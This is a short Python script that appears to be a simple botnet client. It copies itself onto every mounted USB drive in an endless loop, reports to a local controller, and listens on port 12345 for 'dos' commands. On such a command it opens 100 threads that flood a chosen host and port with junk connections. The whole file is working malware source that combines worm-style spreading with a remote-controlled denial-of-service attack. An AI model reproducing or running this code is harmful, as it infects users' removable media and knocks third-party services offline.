#!/usr/bin/python

import socket
import threading
import os

class Bot:
    def __init__(self):
        self.co = socket.socket()
        self.co.connect(("localhost",12222))
        self.co.close()
	
	t = threading.Thread(target=self.copyUSB)
	t.start()

        self.botServerSocket = socket.socket()
        self.botServerSocket.setsockopt(\
                 socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.botServerSocket.bind(('',12345))
        self.botServerSocket.listen(1)
        while(1):
            connection, addr = self.botServerSocket.accept()
            print addr
            response = connection.recv(255)
            response = response.split(' ')
            if  response[0] == "dos":
                self.attack(response[1],int(response[2]))

    def copyUSB(self):
	lofin = os.getlogin()
	src = os.path.dirname(os.path.abspath(__file__))+"/bot.py"
	while (1):
            if len(os.listdir("/media/"+lofin)) > 0:
                for clef in os.listdir("/media/"+lofin):
                    os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py")
                    if not os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py"):
                        destination = "/media/"+lofin +"/" + str(clef)
                        os.system("/bin/cp " + src + " " + destination)

    def attack(self,host,port):
        for i in range(100):
            t = threading.Thread(target=self.dos,args=(host,port,))
            t.start()
        
    def dos(self,host,port):
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dos.connect((host,port))
        dos.send("pekckpe,kc,e,kc,mmk,")
        dos.close()

bot = Bot()
                
